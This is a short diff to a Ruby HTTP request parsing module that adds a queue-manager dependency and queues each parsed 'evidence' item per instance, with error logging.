@@ -2,6 +2,9 @@
 #  HTTP requests parsing module
 #
 
+# relatives
+require_relative 'queue_manager'
+
 # from RCS::Common
 require 'rcs-common/trace'
 require 'rcs-common/mime'
@@ -20,7 +23,7 @@ module Parser
   
   # parse a request from a client
   def http_parse(http_headers, req_method, req_uri, req_cookies, req_content)
-
+    
     # safe value
     resp_status = STATUS_NOT_FOUND
     resp_content_type = 'text/html'
@@ -28,6 +31,14 @@ module Parser
     
     content = JSON.parse(req_content)
     trace :debug, "Content: #{content}"
+    
+    begin
+      content.each_pair do |instance, evidences| evidences.each {|ev| QueueManager.instance.queue(instance, ev)} end
+    rescue Exception => e
+      trace :error, "ERROR: " + e.message
+      trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
+      return resp_status, resp_content, resp_content_type
+    end
     
     # check this is a POST, we don't accept anything else
     if req_method == 'POST'
@@ -49,7 +60,7 @@ module Parser
       return {}
     end
   end
-
+  
 end #Parser
 
 end #Worker::
